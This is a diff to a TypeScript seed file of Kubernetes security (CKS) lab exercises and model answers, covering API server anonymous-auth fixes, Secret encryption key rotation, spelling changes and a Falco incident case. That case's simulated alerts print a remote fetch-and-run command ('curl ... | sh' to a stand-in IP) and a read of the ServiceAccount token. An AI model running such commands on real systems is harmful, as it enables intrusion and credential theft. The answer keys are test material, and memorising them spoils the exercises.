@@ -25,6 +25,7 @@ export const CKS_LABS: SeedLabSet = {
     source("https://kubernetes.io/docs/concepts/security/pod-security-standards/", "reference", "2026-11-07"),
     source("https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/", "reference", "2026-11-07"),
     source("https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/", "reference", "2026-11-07"),
+    source("https://kubernetes.io/docs/reference/access-authn-authz/authentication/", "reference", "2026-11-09"),
   ],
   labs: [
     // ----------------------------------------------------------------- 15%
@@ -60,7 +61,7 @@ export const CKS_LABS: SeedLabSet = {
             part(
               "Cloud-side hardening",
               "Names the complementary cloud control: require the metadata service's session-oriented mode or hop limit 1 (so a hop from a Pod's network namespace is refused) and give the node instance role the minimum permissions, since NetworkPolicy depends on the CNI and does not protect hostNetwork Pods.",
-              "NetworkPolicy only applies to Pods on the Pod network -- a hostNetwork Pod bypasses it -- and only if the CNI enforces policy. So also set the cloud instance metadata service to its hardened mode (token-required requests with a hop limit of 1, which drops requests coming through the Pod network) and scope the node's instance role to what the kubelet and cloud controller need. Defence in depth: the Pod-side policy and the node-side control each cover the other's gap."
+              "NetworkPolicy only applies to Pods on the Pod network -- a hostNetwork Pod bypasses it -- and only if the CNI enforces policy. So also set the cloud instance metadata service to its hardened mode (token-required requests with a hop limit of 1, which drops requests coming through the Pod network) and scope the node's instance role to what the kubelet and cloud controller need. Defense in depth: the Pod-side policy and the node-side control each cover the other's gap."
             ),
           ],
         },
@@ -82,8 +83,8 @@ export const CKS_LABS: SeedLabSet = {
           parts: [
             part(
               "The two critical ones",
-              "Explains --authorization-mode=AlwaysAllow means every authenticated request (and, with anonymous auth on by default, every unauthenticated one) is permitted -- RBAC is not consulted at all; fixes with --authorization-mode=Node,RBAC and --anonymous-auth=false.",
-              "AlwaysAllow disables authorization: anyone who can authenticate -- and with anonymous-auth defaulting to true, anyone who can reach port 6443 -- can do anything, cluster-admin included. Change to:\n    - --authorization-mode=Node,RBAC\n    - --anonymous-auth=false\nNode lets kubelets read what they need; RBAC enforces the Roles and bindings that were being ignored. Check first that the health checks and any integrations do not rely on anonymous access to /healthz or /readyz (they can use /livez with a token or be exempted via RBAC for system:anonymous if truly needed)."
+              "Explains --authorization-mode=AlwaysAllow means every authenticated request (and, with anonymous auth on by default, every unauthenticated one) is permitted -- RBAC is not consulted at all; fixes with --authorization-mode=Node,RBAC. Limits anonymous access to the health endpoints with --authentication-config and an AuthenticationConfiguration whose anonymous.conditions list /livez, /readyz and /healthz (or sets --anonymous-auth=false only after showing nothing, including the API server's own probes, calls anonymously); knows RBAC cannot exempt a request that authentication has already rejected.",
+              "AlwaysAllow disables authorization: anyone who can authenticate -- and with anonymous-auth defaulting to true, anyone who can reach port 6443 -- can do anything, cluster-admin included. Change to:\n    - --authorization-mode=Node,RBAC\nNode lets kubelets read what they need; RBAC enforces the Roles and bindings that were being ignored.\n\nFor anonymous auth, a bare --anonymous-auth=false breaks this kubeadm node: the API server's own liveness, readiness and startup probes call /livez and /readyz without credentials, get 401, and the kubelet keeps restarting the Pod. RBAC cannot exempt them, because the request is rejected at authentication, before authorization runs. Instead, allow anonymous requests only on the health endpoints with a structured authentication config (stable since v1.34):\n    - --authentication-config=/etc/kubernetes/authn-config.yaml\nwith\n  apiVersion: apiserver.config.k8s.io/v1\n  kind: AuthenticationConfiguration\n  anonymous:\n    enabled: true\n    conditions:\n    - path: /livez\n    - path: /readyz\n    - path: /healthz\nmounted read-only through a hostPath volume. Do not also set --anonymous-auth: the flag and the file's anonymous field cannot both be set. Every other path now rejects anonymous requests, which is what 1.2.1 (a Manual check) is after; record the config as its remediation."
             ),
             part(
               "Profiling and audit",
@@ -98,7 +99,7 @@ export const CKS_LABS: SeedLabSet = {
           ],
         },
         {
-          text: "The API server checks pass. The node section still fails:\n\n$ sudo kube-bench run --targets node | grep -E '^\\[FAIL\\]'\n[FAIL] 4.2.1 Ensure that the --anonymous-auth argument is set to false (Automated)\n[FAIL] 4.2.2 Ensure that the --authorization-mode argument is not set to AlwaysAllow (Automated)\n[FAIL] 4.2.6 Ensure that the --protect-kernel-defaults argument is set to true (Automated)\n\n$ sudo grep -E 'anonymous|mode:|protectKernelDefaults' /var/lib/kubelet/config.yaml\n    enabled: true\n  mode: AlwaysAllow\n\n$ sudo kube-bench run --targets etcd | grep -E '^\\[FAIL\\]'\n[FAIL] 2.2 Ensure that the --client-cert-auth argument is set to true (Automated)",
+          text: "The API server checks pass (1.2.1 is a Manual check; its remediation is recorded as the scoped authentication config). The node section still fails:\n\n$ sudo kube-bench run --targets node | grep -E '^\\[FAIL\\]'\n[FAIL] 4.2.1 Ensure that the --anonymous-auth argument is set to false (Automated)\n[FAIL] 4.2.2 Ensure that the --authorization-mode argument is not set to AlwaysAllow (Automated)\n[FAIL] 4.2.6 Ensure that the --protect-kernel-defaults argument is set to true (Automated)\n\n$ sudo grep -E 'anonymous|mode:|protectKernelDefaults' /var/lib/kubelet/config.yaml\n    enabled: true\n  mode: AlwaysAllow\n\n$ sudo kube-bench run --targets etcd | grep -E '^\\[FAIL\\]'\n[FAIL] 2.2 Ensure that the --client-cert-auth argument is set to true (Automated)",
           ask: "Fix the kubelet and etcd findings, and say what each control protects against.",
           parts: [
             part(
@@ -230,7 +231,7 @@ export const CKS_LABS: SeedLabSet = {
             ),
             part(
               "Applying AppArmor to the container",
-              "securityContext.appArmorProfile with type Localhost and localhostProfile k8s-bidder-deny-writes on the bidder container (or at Pod level for all containers); knows the older annotation form is deprecated in favour of this field.",
+              "securityContext.appArmorProfile with type Localhost and localhostProfile k8s-bidder-deny-writes on the bidder container (or at Pod level for all containers); knows the older annotation form is deprecated in favor of this field.",
               "containers:\n- name: bidder\n  securityContext:\n    appArmorProfile:\n      type: Localhost\n      localhostProfile: k8s-bidder-deny-writes\nThe appArmorProfile field (Pod or container securityContext) replaced the container.apparmor.security.beta.kubernetes.io/<name> annotation. type RuntimeDefault would use the runtime's default profile; Localhost names one loaded on the node."
             ),
             part(
@@ -262,7 +263,7 @@ export const CKS_LABS: SeedLabSet = {
           parts: [
             part(
               "What a worker needs",
-              "Keeps kubelet (10250, 10248 on localhost), kube-proxy (10256 health) and the container runtime, plus sshd only if the organisation administers nodes over SSH (ideally restricted); everything else is not part of a worker's job.",
+              "Keeps kubelet (10250, 10248 on localhost), kube-proxy (10256 health) and the container runtime, plus sshd only if the organization administers nodes over SSH (ideally restricted); everything else is not part of a worker's job.",
               "Required: kubelet (10250 API, 10248 healthz on loopback), kube-proxy's health port 10256, containerd (a Unix socket, not a TCP port), and the CNI. sshd stays only if nodes are managed over SSH -- restricted by firewall to the admin network and key-only. Apache, MySQL, rpcbind, snmpd and CUPS have no role on a node; workloads belong in Pods, not on the host."
             ),
             part(
@@ -293,8 +294,8 @@ export const CKS_LABS: SeedLabSet = {
             ),
             part(
               "Preventing recurrence",
-              "Builds nodes from a minimal, purpose-built image (a container-optimised OS or a hardened minimal image baked with the kubelet and runtime), applies CIS node hardening in the image pipeline, and runs kube-bench and a port/service check in CI for the image and periodically on nodes; replaces nodes instead of patching them in place.",
-              "Stop hand-fixing nodes. Build a minimal node image (a container-optimised distribution, or a base image with only kubelet, containerd, CNI and the SSH policy above), apply the CIS node profile in the image build, and gate the image on kube-bench --targets node plus an ss/systemctl listing check. Roll nodes by replacement (new image, drain old) so every node is identical and the next 'standard server image' never reaches the cluster."
+              "Builds nodes from a minimal, purpose-built image (a container-optimized OS or a hardened minimal image baked with the kubelet and runtime), applies CIS node hardening in the image pipeline, and runs kube-bench and a port/service check in CI for the image and periodically on nodes; replaces nodes instead of patching them in place.",
+              "Stop hand-fixing nodes. Build a minimal node image (a container-optimized distribution, or a base image with only kubelet, containerd, CNI and the SSH policy above), apply the CIS node profile in the image build, and gate the image on kube-bench --targets node plus an ss/systemctl listing check. Roll nodes by replacement (new image, drain old) so every node is identical and the next 'standard server image' never reaches the cluster."
             ),
           ],
         },
@@ -318,7 +319,7 @@ export const CKS_LABS: SeedLabSet = {
             part(
               "EncryptionConfiguration",
               "An apiserver.config.k8s.io/v1 EncryptionConfiguration for resources [secrets] whose providers list a real encryption provider first (aescbc or secretbox with a base64 32-byte key, or kms v2) and identity last so existing plaintext can still be read; the key is generated with head -c 32 /dev/urandom | base64 and the file kept root-only on the node.",
-              "head -c 32 /dev/urandom | base64   # key material, keep out of Git and chat\napiVersion: apiserver.config.k8s.io/v1\nkind: EncryptionConfiguration\nresources:\n- resources: [secrets]\n  providers:\n  - aescbc:\n      keys:\n      - name: key1\n        secret: <base64 32-byte key>\n  - identity: {}\nSaved as /etc/kubernetes/enc/enc.yaml with mode 0600. The first provider encrypts new writes; every provider in the list can decrypt, so identity last lets the API server still read Secrets written before encryption was on. (secretbox or a KMS v2 plugin are stronger choices where available; aescbc is the documented minimum.)"
+              "head -c 32 /dev/urandom | base64   # key material, keep out of Git and chat\napiVersion: apiserver.config.k8s.io/v1\nkind: EncryptionConfiguration\nresources:\n- resources: [secrets]\n  providers:\n  - aescbc:\n      keys:\n      - name: key1\n        secret: <base64 32-byte key>\n  - identity: {}\nSaved as /etc/kubernetes/enc/enc.yaml with mode 0600. The first provider encrypts new writes; every provider in the list can decrypt, so identity last lets the API server still read Secrets written before encryption was on. (The Kubernetes docs no longer recommend aescbc, because CBC mode is open to padding-oracle attacks; they prefer a KMS v2 plugin, or secretbox for a local key. aescbc still works and is shown here because it is the provider most worked examples use.)"
             ),
             part(
               "API server flag and mount",
@@ -337,8 +338,8 @@ export const CKS_LABS: SeedLabSet = {
             ),
             part(
               "Rotation",
-              "Adds key2 as the first key in the provider (keeping key1 to decrypt), restarts the API server, rewrites all Secrets with kubectl replace so they are re-encrypted with key2, then removes key1; on a multi-control-plane cluster, every API server must have the new key before it is used for writing.",
-              "1 Generate key2 and put it ABOVE key1 in the aescbc keys list (first key encrypts; all keys decrypt). 2 Restart every kube-apiserver with the new file -- on an HA control plane, roll it to all of them before step 3 so no server receives data it cannot decrypt. 3 kubectl get secrets -A -o json | kubectl replace -f - to re-encrypt with key2. 4 Remove key1 from the file and restart again. Also back up the configuration file securely: an etcd snapshot is useless without the keys that encrypted it."
+              "Adds key2 as the second key (key1 still first, so nothing writes with key2 yet) and restarts every API server; then moves key2 to first and restarts again; rewrites all Secrets with kubectl replace so they are re-encrypted with key2; then removes key1 and restarts. Knows why the two-step order matters on a multi-control-plane cluster: every API server must be able to decrypt with key2 before any server writes with it.",
+              "1 Generate key2 and add it BELOW key1 in the aescbc keys list (the first key encrypts; every key decrypts), so servers learn key2 without using it. 2 Restart every kube-apiserver with that file. 3 Move key2 to the top, above key1, and restart every API server again -- because all of them could already decrypt key2 data, none ever meets a Secret it cannot read, even mid-roll on an HA control plane. 4 kubectl get secrets -A -o json | kubectl replace -f - to re-encrypt with key2. 5 Remove key1 from the file and restart again. Also back up the configuration file securely: an etcd snapshot is useless without the keys that encrypted it."
             ),
           ],
         },
@@ -370,7 +371,7 @@ export const CKS_LABS: SeedLabSet = {
             ),
             part(
               "Network isolation",
-              "Default-deny ingress and egress in partner-quill, plus an egress allow to DNS and to Pods in namespace platform labelled for the ingest Service on 8443; optionally an ingress policy on the ingest Pods accepting only partner-quill.",
+              "Default-deny ingress and egress in partner-quill, plus an egress allow to DNS and to Pods in namespace platform labeled for the ingest Service on 8443; optionally an ingress policy on the ingest Pods accepting only partner-quill.",
               "NetworkPolicy default-deny: podSelector {}, policyTypes [Ingress, Egress]. NetworkPolicy allow-egress: egress to namespaceSelector kubernetes.io/metadata.name=platform + podSelector app=ingest on TCP 8443, and to kube-dns in kube-system on 53 UDP/TCP. The tenant can now reach exactly one Service. On the platform side, an ingress policy on app=ingest allowing from namespaceSelector kubernetes.io/metadata.name=partner-quill closes the other direction's gaps."
             ),
           ],
@@ -396,7 +397,7 @@ export const CKS_LABS: SeedLabSet = {
             ),
             part(
               "Trade-offs",
-              "Explains gVisor intercepts syscalls in a user-space kernel, so the container never talks to the host kernel directly (a kernel CVE in the host is not reachable), at the cost of syscall-heavy performance, some unsupported syscalls/features (certain network and filesystem behaviours, no privileged devices) and a per-node dependency; Kata Containers (lightweight VMs) is the alternative with stronger isolation and higher overhead.",
+              "Explains gVisor intercepts syscalls in a user-space kernel, so the container never talks to the host kernel directly (a kernel CVE in the host is not reachable), at the cost of syscall-heavy performance, some unsupported syscalls/features (certain network and filesystem behaviors, no privileged devices) and a per-node dependency; Kata Containers (lightweight VMs) is the alternative with stronger isolation and higher overhead.",
               "gVisor runs the container's syscalls against its own user-space kernel (the Sentry) and lets only a small, hardened set reach the host, so a Linux kernel bug the tenant's code triggers does not escape. Costs: I/O and syscall-heavy workloads run slower, a few syscalls and kernel features are unimplemented (check the app in staging), and every node needs runsc and the shim. Kata Containers wraps each Pod in a lightweight VM for a hardware boundary at more memory and start-up cost. Either way the tenant stays under restricted PSS, quotas and NetworkPolicy -- the sandbox adds a layer, it does not replace them."
             ),
           ],
@@ -459,7 +460,7 @@ export const CKS_LABS: SeedLabSet = {
       steps: [
         {
           text: "$ kubectl -n dispatch get deploy routing -o jsonpath='{.spec.template.spec.containers[*].image}'\ndocker.io/library/nginx:latest registry.garrison.example/routing:4.1\n\n$ kubectl get validatingadmissionpolicies\nNo resources found",
-          ask: "Write a ValidatingAdmissionPolicy and binding that rejects Pods in namespaces labelled env=production whose containers (init containers included) come from anywhere but registry.garrison.example, explain why this is better than an ImagePolicyWebhook for this need, and say what happens to the already-running Pods.",
+          ask: "Write a ValidatingAdmissionPolicy and binding that rejects Pods in namespaces labeled env=production whose containers (init containers included) come from anywhere but registry.garrison.example, explain why this is better than an ImagePolicyWebhook for this need, and say what happens to the already-running Pods.",
           parts: [
             part(
               "ValidatingAdmissionPolicy",
@@ -485,7 +486,7 @@ export const CKS_LABS: SeedLabSet = {
             part(
               "Security fixes",
               "Removes privileged: true, sets runAsNonRoot: true (with a runAsUser if the image needs it), readOnlyRootFilesystem: true with emptyDir mounts for writable paths, allowPrivilegeEscalation: false and capabilities.drop [ALL], plus seccompProfile RuntimeDefault.",
-              "containers:\n- name: routing\n  image: registry.garrison.example/routing:4.1\n  securityContext:\n    privileged: false\n    runAsNonRoot: true\n    runAsUser: 10001\n    allowPrivilegeEscalation: false\n    readOnlyRootFilesystem: true\n    capabilities:\n      drop: [\"ALL\"]\n    seccompProfile:\n      type: RuntimeDefault\n  volumeMounts:\n  - {name: tmp, mountPath: /tmp}\nvolumes:\n- name: tmp\n  emptyDir: {}\nprivileged is the one finding that is never acceptable in a web service: it is root on the node. The rest together satisfy the restricted Pod Security Standard, so the same manifest passes PSA if the namespace is labelled."
+              "containers:\n- name: routing\n  image: registry.garrison.example/routing:4.1\n  securityContext:\n    privileged: false\n    runAsNonRoot: true\n    runAsUser: 10001\n    allowPrivilegeEscalation: false\n    readOnlyRootFilesystem: true\n    capabilities:\n      drop: [\"ALL\"]\n    seccompProfile:\n      type: RuntimeDefault\n  volumeMounts:\n  - {name: tmp, mountPath: /tmp}\nvolumes:\n- name: tmp\n  emptyDir: {}\nprivileged is the one finding that is never acceptable in a web service: it is root on the node. The rest together satisfy the restricted Pod Security Standard, so the same manifest passes PSA if the namespace is labeled."
             ),
             part(
               "Resources and replicas",
@@ -509,17 +510,17 @@ export const CKS_LABS: SeedLabSet = {
       kind: "case",
       title: "Work a Falco alert back to the attack and forward to containment",
       brief:
-        "Falco runs as a DaemonSet on the fictional recruitment platform Ashford Talent's production cluster, forwarding alerts to the on-call channel. At 02:14 three alerts arrive within a minute for a Pod in namespace web. You are on call.",
+        "Falco runs as a DaemonSet on the fictional recruitment platform Ashford Talent's production cluster, forwarding alerts to the on-call channel; besides the default rules, the team runs its own rule that flags any shell started by a web server process. At 02:14 three alerts arrive within a minute for a Pod in namespace web. You are on call.",
       safetyNote: GENERAL_SAFETY,
       steps: [
         {
-          text: "02:14:03.118 Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=-1 k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m container=4f1e9a2b7c3d shell=sh parent=node cmdline=sh -c \"curl -s http://203.0.113.77/r.sh | sh\" terminal=0)\n02:14:04.402 Warning Outbound connection to a suspicious IP (command=curl -s http://203.0.113.77/r.sh connection=10.244.3.17:51822->203.0.113.77:80 k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m)\n02:14:09.771 Error Read sensitive file untrusted (user=root command=cat /var/run/secrets/kubernetes.io/serviceaccount/token file=/var/run/secrets/kubernetes.io/serviceaccount/token k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m)\n\n$ kubectl -n web get pod cv-upload-6b7d9c8f5-x2k4m -o jsonpath='{.spec.serviceAccountName} {.spec.containers[0].securityContext}'\ncv-upload {}\n\n$ kubectl auth can-i --list --as=system:serviceaccount:web:cv-upload | grep -vE 'selfsubject' | head -4\nResources   Non-Resource URLs   Resource Names   Verbs\nsecrets     []                  []               [get list]\npods        []                  []               [get list create]",
+          text: "02:14:03.118 Notice Shell spawned by a web server process (user=root user_loginuid=-1 k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m container=4f1e9a2b7c3d shell=sh parent=node cmdline=sh -c \"curl -s http://203.0.113.77/r.sh | sh\" terminal=0)\n02:14:04.402 Warning Outbound connection to a suspicious IP (command=curl -s http://203.0.113.77/r.sh connection=10.244.3.17:51822->203.0.113.77:80 k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m)\n02:14:09.771 Error Read sensitive file untrusted (user=root command=cat /var/run/secrets/kubernetes.io/serviceaccount/token file=/var/run/secrets/kubernetes.io/serviceaccount/token k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m)\n\n$ kubectl -n web get pod cv-upload-6b7d9c8f5-x2k4m -o jsonpath='{.spec.serviceAccountName} {.spec.containers[0].securityContext}'\ncv-upload {}\n\n$ kubectl auth can-i --list --as=system:serviceaccount:web:cv-upload | grep -vE 'selfsubject' | head -4\nResources   Non-Resource URLs   Resource Names   Verbs\nsecrets     []                  []               [get list]\npods        []                  []               [get list create]",
           ask: "Reconstruct what happened in attack-phase terms from the three alerts and the two kubectl results, and say what the attacker can do next if you do nothing.",
           parts: [
             part(
               "Phases from the evidence",
               "Maps the evidence: initial access through the Node.js upload service (the shell's parent is node), execution of a remote script via curl | sh (and outbound connection to an external IP), then credential access -- reading the Pod's ServiceAccount token -- as a step toward privilege escalation and lateral movement inside the cluster.",
-              "Initial access: the cv-upload web process (parent=node) spawned a shell -- something in the upload handling let an attacker run commands, a classic web exploit. Execution: it fetched and ran a script from 203.0.113.77 (the outbound alert) -- the attacker's staging host. Credential access: the script read the mounted ServiceAccount token. The container runs as root with an empty securityContext, which made every step easier. Nothing yet shows exfiltration of user data, but the token is now in the attacker's hands."
+              "Initial access: the cv-upload web process (parent=node) spawned a shell with no terminal (terminal=0, so not someone's kubectl exec -it) -- something in the upload handling let an attacker run commands, a classic web exploit. Execution: it fetched and ran a script from 203.0.113.77 (the outbound alert) -- the attacker's staging host. Credential access: the script read the mounted ServiceAccount token. The container runs as root with an empty securityContext, which made every step easier. Nothing yet shows exfiltration of user data, but the token is now in the attacker's hands."
             ),
             part(
               "What the token buys them",
